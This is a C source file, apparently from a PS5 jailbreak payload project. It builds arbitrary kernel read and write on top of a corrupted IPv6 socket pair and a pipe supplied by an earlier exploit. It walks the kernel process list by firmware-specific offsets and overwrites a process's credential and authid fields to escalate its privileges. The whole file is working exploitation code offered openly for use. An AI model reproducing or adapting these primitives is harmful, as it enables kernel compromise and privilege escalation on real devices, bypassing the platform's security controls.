/* Copyright (C) 2023 John Törnblom

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 3, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; see the file COPYING. If not, see
<http://www.gnu.org/licenses/>.  */

#include "payload.h"


/**
 * standard macros.
 **/
#define IPPROTO_IPV6 41
#define IPV6_PKTINFO 46


/**
 * libkernel symbols
 **/
static long (*_read)(int, void*, unsigned long);
static long (*_write)(int, const void*, unsigned long);
static int (*_getsockopt)(int, int, int, void *, unsigned int *);
static int (*_setsockopt)(int, int, int, const void*, unsigned int);
static int (*sysctlbyname)(const char *, void *, unsigned long*,
			   const void *, unsigned long);


/**
 * public constants.
 **/
unsigned long KERNEL_ADDRESS_DATA_BASE = 0;
unsigned long KERNEL_ADDRESS_ALLPROC = 0;

const unsigned long KERNEL_OFFSET_PROC_P_UCRED = 0x40;
const unsigned long KERNEL_OFFSET_PROC_P_PID   = 0xBC;

const unsigned long KERNEL_OFFSET_UCRED_CR_UID   = 0x04;
const unsigned long KERNEL_OFFSET_UCRED_CR_RUID  = 0x08;
const unsigned long KERNEL_OFFSET_UCRED_CR_SVUID = 0x0C;
const unsigned long KERNEL_OFFSET_UCRED_CR_RGID  = 0x14;

const unsigned long KERNEL_OFFSET_UCRED_CR_SCEAUTHID = 0x58;
const unsigned long KERNEL_OFFSET_UCRED_CR_SCECAPS0  = 0x60;
const unsigned long KERNEL_OFFSET_UCRED_CR_SCECAPS1  = 0x68;
const unsigned long KERNEL_OFFSET_UCRED_CR_SCEATTR0  = 0x83;


/**
 * private global variables.
 **/
static int master_sock = -1;
static int victim_sock = -1;
static int rw_pipe[2] = {-1, -1};
static unsigned long pipe_addr = 0;
static unsigned long kdata_base = 0;



/**
 *
 **/
unsigned int
kernel_get_fw_version(void) {
  unsigned int version = 0;
  unsigned long size = sizeof(version);

  if(sysctlbyname("kern.sdk_version", &version, &size, 0, 0)) {
    return 0;
  }

  return version;
}


__attribute__((constructor(101))) static void
kernel_constructor(const payload_args_t *args) {
  int error = 0;

  if((error=args->sceKernelDlsym(0x2001, "_read", &_read))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "_write", &_write))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "_setsockopt", &_setsockopt))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "_getsockopt", &_getsockopt))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "sysctlbyname", &sysctlbyname))) {
    *args->payloadout = error;
    return;
  }

  if((master_sock=args->rwpair[0]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if((victim_sock=args->rwpair[1]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if((rw_pipe[0]=args->rwpipe[0]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if((rw_pipe[1]=args->rwpipe[1]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if(!(pipe_addr=args->kpipe_addr)) {
    *args->payloadout = -1;
    return;
  }

  if(!(KERNEL_ADDRESS_DATA_BASE=args->kdata_base_addr)) {
    *args->payloadout = -1;
    return;
  }

  switch(kernel_get_fw_version() & 0xffff0000) {
  case 0x3000000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x276DC58;
    break;

  case 0x3100000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x276DC58;
    break;

  case 0x3200000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x276DC58;
    break;

  case 0x3210000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x276DC58;
    break;

  case 0x4020000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x27EDCB8;
    break;

  case 0x4030000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x27EDCB8;
    break;

  case 0x4500000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x27EDCB8;
    break;

  case 0x4510000:
    KERNEL_ADDRESS_ALLPROC = KERNEL_ADDRESS_DATA_BASE + 0x27EDCB8;
    break;

  default:
    *args->payloadout = -1;
    return;
  }
}


/**
 *
 **/
static int
kernel_write(unsigned long addr, unsigned long *data) {
  unsigned long victim_buf[3];

  victim_buf[0] = addr;
  victim_buf[1] = 0;
  victim_buf[2] = 0;

  if(_setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, victim_buf, 0x14)) {
    return -1;
  }

  if(_setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, data, 0x14)) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_copyin(const void *udaddr, unsigned long kaddr, unsigned long len) {
  unsigned long write_buf[3];

  // Set pipe flags
  write_buf[0] = 0;
  write_buf[1] = 0x4000000000000000;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Set pipe data addr
  write_buf[0] = kaddr;
  write_buf[1] = 0;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr + 0x10, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Perform write across pipe
  if(_write(rw_pipe[1], udaddr, len) < 0) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_copyout(unsigned long kaddr, void *udaddr, unsigned long len) {
  unsigned long write_buf[3];

  // Set pipe flags
  write_buf[0] = 0x4000000040000000;
  write_buf[1] = 0x4000000000000000;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Set pipe data addr
  write_buf[0] = kaddr;
  write_buf[1] = 0;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr + 0x10, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Perform read across pipe
  if(_read(rw_pipe[0], udaddr, len) < 0) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
unsigned long
kernel_get_proc(unsigned int pid) {
  unsigned int other_pid = 0;
  unsigned long addr = 0;
  unsigned long next = 0;

  if(kernel_copyout(KERNEL_ADDRESS_ALLPROC, &addr, sizeof(addr))) {
    return 0;
  }

  while(addr) {
    if(kernel_copyout(addr + KERNEL_OFFSET_PROC_P_PID, &other_pid,
		      sizeof(other_pid))) {
      return 0;
    }

    if(pid == other_pid) {
      break;
    }

    if(kernel_copyout(addr, &next, sizeof(next))) {
      return 0;
    }

    addr = next;
  }

  return addr;
}


/**
 *
 **/
unsigned long
kernel_get_ucred(unsigned int pid) {
  unsigned long proc = 0;
  unsigned long ucred = 0;

  if(!(proc=kernel_get_proc(pid))) {
    return 0;
  }

  if(kernel_copyout(proc + KERNEL_OFFSET_PROC_P_UCRED, &ucred,
		    sizeof(ucred))) {
    return 0;
  }

  return ucred;
}


/**
 *
 **/
unsigned long
kernel_get_proc_authid(unsigned int pid) {
  unsigned long authid = 0;
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_ucred(pid))) {
    return 0;
  }

  if(kernel_copyout(ucred + KERNEL_OFFSET_UCRED_CR_SCEAUTHID, &authid,
		    sizeof(authid))) {
    return 0;
  }

  return authid;
}


/**
 *
 **/
int
kernel_set_proc_authid(unsigned int pid, unsigned long authid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&authid, ucred + KERNEL_OFFSET_UCRED_CR_SCEAUTHID,
		   sizeof(authid))) {
    return -1;
  }

  return 0;
}

